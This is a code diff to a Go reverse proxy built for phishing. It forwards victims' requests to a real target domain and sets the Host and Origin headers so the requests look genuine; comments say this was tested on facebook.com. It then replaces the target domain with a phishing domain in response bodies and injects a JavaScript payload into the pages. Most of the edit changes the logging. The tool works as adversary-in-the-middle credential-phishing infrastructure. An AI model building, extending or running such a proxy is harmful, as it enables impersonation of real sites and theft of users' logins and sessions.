@@ -36,16 +36,9 @@ func createProxy() *httputil.ReverseProxy {
 
 func modifyRequest(req *http.Request) {
 
+	logMessage := "PROXY -> TARGET request\n"
+
 	target, _ := url.Parse("https://www." + targetDomain)
-
-	if verbosity == VerbosityOriginal || verbosity == VerbosityAll {
-		message := fmt.Sprintf("PROXY -> TARGET [ORIGINAL] |\nMethod: %s\nURL:%s\nHeaders:\n%v",
-			req.Method, req.URL.String(), formatHeaders(req.Header))
-
-		if ShouldFilter(message) {
-			log.Println(message)
-		}
-	}
 
 	req.URL.Scheme = target.Scheme
 	req.URL.Host = target.Host
@@ -57,26 +50,25 @@ func modifyRequest(req *http.Request) {
 	req.Header.Del("Forwarded")
 	req.Header.Del("Via")
 
-	if verbosity == VerbosityModified || verbosity == VerbosityAll {
-		message := fmt.Sprintf("PROXY -> TARGET [MODIFIED] |\nMethod: %s\nURL:%s\nHeaders:\n%v",
-			req.Method, req.URL.String(), formatHeaders(req.Header))
+	req.Header.Set("Host", "www."+targetDomain)           // testsed and works for facebook.com for now
+	req.Header.Set("Origin", "https://www."+targetDomain) // tested and works for facebook.com fow now
+	req.Header.Del("Referer")                             // this is also to simulate similar request to facebook.com
 
-		if ShouldFilter(message) {
-			log.Println(message)
-		}
+	if verbosity >= VerbosityHeaders {
+		logMessage += fmt.Sprintf("Method: %s\nURL:%s\nHeaders:\n%v\n",
+			req.Method, req.URL.String(), formatHeaders(req.Header))
+	}
+
+	// Can not log out the request body yet..
+
+	if ShouldFilter(logMessage) {
+		log.Println(logMessage)
 	}
 }
 
 func modifyResponse(resp *http.Response) error {
 
-	if verbosity == VerbosityOriginal || verbosity == VerbosityAll {
-		message := fmt.Sprintf("CLIENT <- PROXY response [ORIGINAL] |\nStatus Code: %d\nStatus:%s\nHeaders:\n%v",
-			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
-
-		if ShouldFilter(message) {
-			log.Println(message)
-		}
-	}
+	logMessage := "CLIENT <- PROXY response\n"
 
 	// Check if original response had CORS headers
 	if resp.Header.Get("Access-Control-Allow-Origin") == "*" {
@@ -122,14 +114,22 @@ func modifyResponse(resp *http.Response) error {
 
 	encoding := resp.Header.Get("Content-Encoding")
 
+	if verbosity >= VerbosityHeaders {
+		logMessage += fmt.Sprintf("Status Code: %d\nStatus:%s\nHeaders:\n%v\n",
+			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
+	}
+
 	body, err := decompressBody(resp.Body, encoding)
 	if err != nil {
 		return err
 	}
 
 	modified := bytes.ReplaceAll(body, []byte(targetDomain), []byte(phishingDomain))
-
 	modified = injectJS(modified, jsPayload)
+
+	if verbosity == VerbosityAll {
+		logMessage += string(modified) + "\n"
+	}
 
 	newBody, err := compressBody(modified, encoding)
 	if err != nil {
@@ -144,13 +144,8 @@ func modifyResponse(resp *http.Response) error {
 		resp.Header.Set("Content-Encoding", encoding)
 	}
 
-	if verbosity == VerbosityModified || verbosity == VerbosityAll {
-		message := fmt.Sprintf("CLIENT <- PROXY response [MODIFIED] |\nStatus Code: %d\nStatus:%s\nHeaders:\n%v",
-			resp.StatusCode, resp.Status, formatHeaders(resp.Header))
-
-		if ShouldFilter(message) {
-			log.Println(message)
-		}
+	if ShouldFilter(logMessage) {
+		log.Println(logMessage)
 	}
 
 	return nil
